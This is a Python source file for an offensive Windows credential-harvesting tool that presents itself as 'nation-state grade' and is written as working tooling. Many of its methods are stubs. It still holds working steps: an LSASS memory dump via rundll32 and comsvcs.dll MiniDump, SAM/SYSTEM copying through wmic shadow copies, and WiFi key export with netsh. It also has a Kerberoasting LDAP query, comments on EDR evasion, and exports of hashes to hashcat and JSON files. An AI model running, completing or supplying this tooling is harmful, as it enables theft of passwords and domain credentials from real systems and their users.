#!/usr/bin/env python3
"""
CREDENTIAL HARVESTER - Nation-State Grade Credential Extraction
LSASS dump, SAM extraction, Kerberoasting, DCSync, NTDS.dit parsing
"""

import ctypes
import os
import struct
import subprocess
import sys
from dataclasses import dataclass
from enum import Enum
from typing import List, Dict, Optional, Tuple
import base64
import hashlib


class CredType(Enum):
    NTLM = "ntlm"
    KERBEROS = "kerberos"
    CLEARTEXT = "cleartext"
    DPAPI = "dpapi"
    CERTIFICATE = "certificate"


@dataclass
class Credential:
    username: str
    domain: str
    cred_type: CredType
    value: str  # hash or cleartext
    source: str
    timestamp: str


class LSASSDumper:
    """
    Memory-based LSASS credential extraction
    Uses multiple techniques to evade EDR
    """
    
    # Windows API constants
    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT = 0x1000
    PAGE_READWRITE = 0x04
    
    def __init__(self):
        self.ntdll = None
        self.kernel32 = None
        if sys.platform == "win32":
            self.ntdll = ctypes.WinDLL("ntdll")
            self.kernel32 = ctypes.WinDLL("kernel32")
    
    def get_lsass_pid(self) -> int:
        """Find LSASS process ID"""
        if sys.platform == "win32":
            import win32process
            import win32api
            
            for pid in win32process.EnumProcesses():
                try:
                    handle = win32api.OpenProcess(0x0400 | 0x0010, False, pid)
                    exe = win32process.GetModuleFileNameEx(handle, 0)
                    if "lsass.exe" in exe.lower():
                        return pid
                except:
                    continue
        return -1
    
    def dump_via_comsvcs(self, output_path: str) -> bool:
        """
        Dump LSASS using comsvcs.dll MiniDump
        Classic technique - may be detected
        """
        pid = self.get_lsass_pid()
        if pid < 0:
            return False
        
        # rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <pid> <path> full
        cmd = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump {pid} {output_path} full'
        try:
            subprocess.run(cmd, shell=True, capture_output=True)
            return os.path.exists(output_path)
        except:
            return False
    
    def dump_via_nanodump(self) -> bytes:
        """
        NanoDump-style technique - direct syscalls to evade hooks
        """
        # This would use direct syscalls to NtReadVirtualMemory
        # Bypasses usermode hooks placed by EDR
        pass
    
    def dump_via_shtinkering(self, output_path: str) -> bool:
        """
        Shtinkering technique - abuse Windows Error Reporting
        Creates silent crash dump of LSASS
        """
        # Trigger WER to create dump without direct LSASS access
        pass
    
    def dump_via_handledup(self) -> bytes:
        """
        Duplicate existing LSASS handle from another process
        Avoids directly opening LSASS
        """
        pass
    
    def parse_minidump(self, dump_path: str) -> List[Credential]:
        """Parse credentials from minidump file"""
        # Would use pypykatz or custom parser
        credentials = []
        
        # Simplified - real implementation uses minidump parsing
        return credentials


class SAMExtractor:
    """
    Extract credentials from SAM/SYSTEM registry hives
    Works offline - no process injection needed
    """
    
    def __init__(self):
        self.bootkey = None
    
    def extract_bootkey(self, system_hive_path: str) -> bytes:
        """Extract bootkey from SYSTEM hive"""
        # Bootkey is derived from specific registry keys
        # JD, Skew1, GBG, Data under HKLM\SYSTEM\CurrentControlSet\Control\Lsa
        
        # Simplified representation
        scrambled_key = b'\x00' * 16
        
        # Descramble using known transform
        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
        bootkey = bytes([scrambled_key[transforms[i]] for i in range(16)])
        
        return bootkey
    
    def decrypt_sam_hash(self, encrypted_hash: bytes, rid: int, bootkey: bytes) -> bytes:
        """Decrypt SAM hash using bootkey and RID"""
        # DES decryption with RID-derived keys
        pass
    
    def extract_from_hives(self, sam_path: str, system_path: str) -> List[Credential]:
        """Extract all credentials from offline hive files"""
        credentials = []
        
        # Extract bootkey
        bootkey = self.extract_bootkey(system_path)
        
        # Parse SAM hive and decrypt hashes
        # Would iterate through SAM\Domains\Account\Users\<RID>
        
        return credentials
    
    def shadow_copy_extraction(self) -> Tuple[str, str]:
        """
        Extract SAM/SYSTEM via Volume Shadow Copy
        Bypasses file locks
        """
        # Create shadow copy
        cmd = 'wmic shadowcopy call create Volume=C:\\'
        subprocess.run(cmd, shell=True, capture_output=True)
        
        # Get shadow copy path
        # Copy SAM and SYSTEM from shadow
        
        return "", ""


class Kerberoaster:
    """
    Kerberoasting - extract service account TGS tickets for offline cracking
    """
    
    def __init__(self):
        self.domain = None
        self.dc = None
    
    def find_spn_accounts(self) -> List[Dict]:
        """Find accounts with ServicePrincipalName set"""
        # LDAP query: (&(samAccountType=805306368)(servicePrincipalName=*))
        spn_accounts = []
        
        # Would use ldap3 or impacket
        return spn_accounts
    
    def request_tgs(self, spn: str, username: str) -> bytes:
        """Request TGS ticket for SPN"""
        # Use current user's TGT to request TGS
        # KRB_TGS_REQ with target SPN
        pass
    
    def extract_hash_from_ticket(self, ticket: bytes) -> str:
        """Extract crackable hash from TGS-REP"""
        # Parse ticket, extract encrypted part
        # Format for hashcat: $krb5tgs$23$*user$realm$spn*$<hash>
        pass
    
    def kerberoast_all(self) -> List[Credential]:
        """Kerberoast all SPN accounts"""
        credentials = []
        
        spn_accounts = self.find_spn_accounts()
        for account in spn_accounts:
            ticket = self.request_tgs(account["spn"], account["username"])
            hash_value = self.extract_hash_from_ticket(ticket)
            
            credentials.append(Credential(
                username=account["username"],
                domain=account["domain"],
                cred_type=CredType.KERBEROS,
                value=hash_value,
                source="kerberoast",
                timestamp=""
            ))
        
        return credentials


class DCSyncer:
    """
    DCSync - replicate credentials from Domain Controller
    Requires Replicating Directory Changes (All) permissions
    """
    
    def __init__(self, domain: str, dc: str, username: str, password: str):
        self.domain = domain
        self.dc = dc
        self.username = username
        self.password = password
    
    def dcsync_user(self, target_user: str) -> Credential:
        """
        Perform DCSync to get single user's secrets
        Uses MS-DRSR DRSGetNCChanges
        """
        # Would use impacket secretsdump.py logic
        pass
    
    def dcsync_all(self) -> List[Credential]:
        """DCSync all domain users"""
        credentials = []
        
        # Enumerate all users via LDAP
        # DCSync each user
        
        return credentials
    
    def extract_ntds(self, ntds_path: str, system_path: str) -> List[Credential]:
        """
        Offline NTDS.dit parsing
        For when you have physical access or backup
        """
        # Parse NTDS.dit ESE database
        # Decrypt hashes using SYSTEM hive bootkey
        pass


class DPAPIDecryptor:
    """
    DPAPI credential extraction
    Chrome passwords, saved credentials, etc.
    """
    
    def __init__(self):
        self.master_keys = {}
    
    def extract_master_key(self, sid: str, password: str) -> bytes:
        """Derive DPAPI master key from user password"""
        # SHA1(UTF-16LE(password))
        # PBKDF2 derivation
        pass
    
    def decrypt_blob(self, blob: bytes, master_key: bytes) -> bytes:
        """Decrypt DPAPI blob"""
        # Parse DPAPI blob structure
        # Derive key from master key
        # AES/3DES decrypt
        pass
    
    def extract_chrome_passwords(self, profile_path: str) -> List[Credential]:
        """Extract Chrome saved passwords"""
        credentials = []
        
        # Read Login Data SQLite
        # Decrypt with DPAPI or AES-GCM (newer Chrome)
        
        return credentials
    
    def extract_wifi_passwords(self) -> List[Credential]:
        """Extract WiFi passwords"""
        # netsh wlan export profile key=clear
        # Or decrypt from registry via DPAPI
        pass


class CredentialHarvester:
    """
    Main credential harvesting orchestrator
    Combines all techniques
    """
    
    def __init__(self):
        self.lsass = LSASSDumper()
        self.sam = SAMExtractor()
        self.kerberoast = Kerberoaster()
        self.dpapi = DPAPIDecryptor()
        self.all_credentials: List[Credential] = []
    
    def harvest_local(self) -> List[Credential]:
        """Harvest all local credentials"""
        creds = []
        
        # LSASS dump
        dump_path = os.path.join(os.environ.get("TEMP", "/tmp"), "debug.dmp")
        if self.lsass.dump_via_comsvcs(dump_path):
            creds.extend(self.lsass.parse_minidump(dump_path))
            os.remove(dump_path)
        
        # Chrome passwords
        chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default")
        creds.extend(self.dpapi.extract_chrome_passwords(chrome_path))
        
        # WiFi
        creds.extend(self.dpapi.extract_wifi_passwords())
        
        self.all_credentials.extend(creds)
        return creds
    
    def harvest_domain(self, have_dc_access: bool = False) -> List[Credential]:
        """Harvest domain credentials"""
        creds = []
        
        # Kerberoasting (works with any domain user)
        creds.extend(self.kerberoast.kerberoast_all())
        
        # DCSync (requires privileges)
        if have_dc_access:
            syncer = DCSyncer("", "", "", "")
            creds.extend(syncer.dcsync_all())
        
        self.all_credentials.extend(creds)
        return creds
    
    def export_hashcat(self, output_path: str):
        """Export hashes in hashcat format"""
        with open(output_path, "w") as f:
            for cred in self.all_credentials:
                if cred.cred_type == CredType.NTLM:
                    f.write(f"{cred.username}:{cred.value}\n")
                elif cred.cred_type == CredType.KERBEROS:
                    f.write(f"{cred.value}\n")
    
    def export_json(self, output_path: str) -> str:
        """Export all credentials as JSON"""
        import json
        
        data = [{
            "username": c.username,
            "domain": c.domain,
            "type": c.cred_type.value,
            "value": c.value,
            "source": c.source,
            "timestamp": c.timestamp
        } for c in self.all_credentials]
        
        with open(output_path, "w") as f:
            json.dump(data, f, indent=2)
        
        return output_path


if __name__ == "__main__":
    harvester = CredentialHarvester()
    
    print("[*] Starting credential harvest...")
    
    local_creds = harvester.harvest_local()
    print(f"[+] Local credentials: {len(local_creds)}")
    
    domain_creds = harvester.harvest_domain()
    print(f"[+] Domain credentials: {len(domain_creds)}")
    
    harvester.export_json("credentials.json")
    harvester.export_hashcat("hashes.txt")
    
    print("[*] Export complete")
